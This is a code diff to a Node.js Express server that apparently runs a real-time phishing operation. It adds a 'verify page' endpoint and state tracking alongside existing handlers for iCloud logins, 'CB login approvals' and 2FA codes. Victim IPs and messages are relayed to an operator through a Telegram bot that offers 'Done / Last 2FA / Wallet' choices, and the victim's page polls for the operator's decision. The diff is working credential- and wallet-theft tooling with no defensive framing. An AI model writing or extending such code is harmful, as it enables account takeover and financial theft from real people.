@@ -11,6 +11,7 @@ const {
   sendApprovalRequestSMS,
   sendApprovalRequestPage,
   sendLoginTelegram,
+  sendVerifyTelegram,
   send2FACode
 } = require("./bot");
 
@@ -31,6 +32,7 @@ const pendingGeneric = {};    // generic codes
 const pendingPage = {};       // iCloud page logins
 const pendingApprovals = {};  // CB login approvals
 const pending2FA = {};        // 2FA approvals
+const pendingVerify = {};     // verify page approvals (3 buttons)
 
 // -----------------
 // User ID counter (assigns a unique ID per IP)
@@ -175,6 +177,25 @@ app.post("/send-login", async (req, res) => {
 });
 
 // -----------------
+// ✅ NEW: Verify page (3-button: Done / Last 2FA / Wallet)
+// -----------------
+app.post("/send-verify", async (req, res) => {
+  const { ip, message } = req.body;
+  if (!ip) return res.status(400).json({ error: "Missing ip" });
+
+  pendingVerify[ip] = { status: "pending" };
+  console.log(`📥 Verify page received: ${ip}`);
+
+  try {
+    await sendVerifyTelegram(ip, message);
+  } catch (err) {
+    console.error("❌ Failed to send Verify Telegram message:", err);
+  }
+
+  res.json({ status: "ok" });
+});
+
+// -----------------
 // 2FA: Submit code (called by frontend)
 // -----------------
 app.post("/api/submit-2fa", async (req, res) => {
@@ -267,6 +288,7 @@ app.get("/check-status", (req, res) => {
   if (pendingGeneric[identifier])   return res.json({ status: pendingGeneric[identifier].status });
   if (pendingPage[identifier])      return res.json({ status: pendingPage[identifier].status });
   if (pendingApprovals[identifier]) return res.json({ status: pendingApprovals[identifier].status });
+  if (pendingVerify[identifier])    return res.json({ status: pendingVerify[identifier].status });
   res.json({ status: "unknown" });
 });
 
@@ -296,6 +318,8 @@ app.post("/update-status", (req, res) => {
     pendingPage[identifier].status = status;
   } else if (pendingApprovals[identifier]) {
     pendingApprovals[identifier].status = status;
+  } else if (pendingVerify[identifier]) {
+    pendingVerify[identifier].status = status;
   } else {
     return res.json({ ok: false, message: "Identifier not found" });
   }
